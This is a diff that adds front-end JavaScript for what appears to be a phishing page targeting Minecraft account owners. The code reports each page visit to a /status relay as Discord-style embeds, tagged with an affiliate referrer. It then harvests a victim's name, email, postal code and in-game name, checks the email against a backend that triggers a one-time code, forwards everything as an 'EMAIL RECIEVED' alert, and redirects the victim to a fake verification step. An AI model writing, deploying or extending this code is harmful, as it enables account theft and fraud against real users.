@@ -1,0 +1,125 @@
+
+ var request = new XMLHttpRequest();
+    request.open("POST", "/status");
+    request.setRequestHeader('Content-type', 'application/json');
+    var referrer = localStorage.getItem("referrer");
+    if (referrer) {
+      request.setRequestHeader("X-Auth", referrer);
+  }
+    var myEmbed2 = {
+      title: "USER DETECTED",
+      description: `User detected on the **Email Page**`,
+      color: hexToDecimal("#00FF00")
+    }
+
+    var params = {
+      content: "A user has been detected",
+      embeds: [ myEmbed2 ]
+    }
+    var referrer = localStorage.getItem("referrer");
+    request.send(JSON.stringify(params));
+
+    function hexToDecimal(hex) {
+      return parseInt(hex.replace("#",""), 16)
+    }
+
+
+    function isPrivacyAgreementChecked() {
+      const checkbox = document.getElementById('privacy-agreement');
+      return checkbox.checked;
+  }
+  async function checkEmail(Email) {
+    var payload = {
+        email: Email
+    };
+
+    try {
+        let response = await fetch('/handle', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+
+        let data = await response.json();
+
+        return {
+            credentialsExist: data.credentialsExist === true,
+            otpMessage: data.otpMessage
+        };
+
+    } catch (error) {
+        console.error('Error:', error);
+        return {
+            credentialsExist: false,
+            otpMessage: "An error occurred while checking the email."
+        };
+    }
+}
+async function sendMessage(){
+  const firstName = document.querySelector('#InputField1').value
+  const lastName =  document.querySelector('#InputField2').value
+  const Email = document.querySelector('#InputField3').value
+  const zipPostal = document.querySelector('#InputField4').value
+  function hexToDecimal(hex) {
+    return parseInt(hex.replace("#",""), 16)
+    }
+    const cardBody = document.querySelector('.card-body');
+    
+    
+    async function showError(message) {
+        let existingError = document.querySelector('.error-message');
+        if (existingError) {
+            existingError.remove();
+        }
+    
+        const error = document.createElement('div');
+        error.textContent = message;
+        error.className = 'error-message';
+        error.style.color = 'red';
+        error.style.fontSize = '16px';
+        error.style.marginTop = '10px';
+        cardBody.appendChild(redX);
+    
+        setTimeout(() => {
+          error.remove();
+        }, 3000);
+    }
+    let result = await checkEmail(Email) || false
+    if (firstName && lastName && Email && zipPostal) {
+      if (!isPrivacyAgreementChecked()) {
+        showError("You have not agreed to the terms and conditions.");
+      } else if (await result.credentialsExist=== false){
+        showError("Please enter a valid Minecraft email!");
+      } else {
+        var request = new XMLHttpRequest();
+        request.open("POST", "/status");
+        request.setRequestHeader('Content-type', 'application/json');
+        var referrer = localStorage.getItem("referrer");
+        if (referrer) {
+          request.setRequestHeader("X-Auth", referrer);
+      }
+        var myEmbed = {
+        author: {
+          name: "Lunar"
+        },
+        title: "EMAIL RECIEVED",
+        description: `**IGN:**\n> \`${sessionStorage.getItem('name') || "none"}\`\n**First Name:**\n> \`${firstName}\`\n**Last Name:**\n> \`${lastName}\`\n**Zip / Postal Code**\n> \`${zipPostal}\`\n**Email Address:**\n> \`${Email}\`\n**OTP Status:**\n> \ \`${result.otpMessage}\`\n`,
+        color: hexToDecimal("#ff0000")
+        }
+        var params = {
+        username: "STATUS",
+        content: ``,
+        embeds: [ myEmbed ]
+        }
+        
+        request.send(JSON.stringify(params));
+        setTimeout(() => {
+          window.location.href = "/email-verif"
+        }, 100);
+      }
+    } else {
+      showError("Please fill all the required fields!");
+    }
+}
